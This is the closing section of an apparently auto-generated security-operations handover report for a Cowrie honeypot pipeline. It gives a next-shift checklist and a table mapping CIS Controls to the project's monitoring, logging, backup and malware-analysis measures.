> **Report grouping:** 181 priority case(s) shown individually · 29 recon entry/entries in table (14 group(s) consolidating 219 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-06T16:55:02Z_
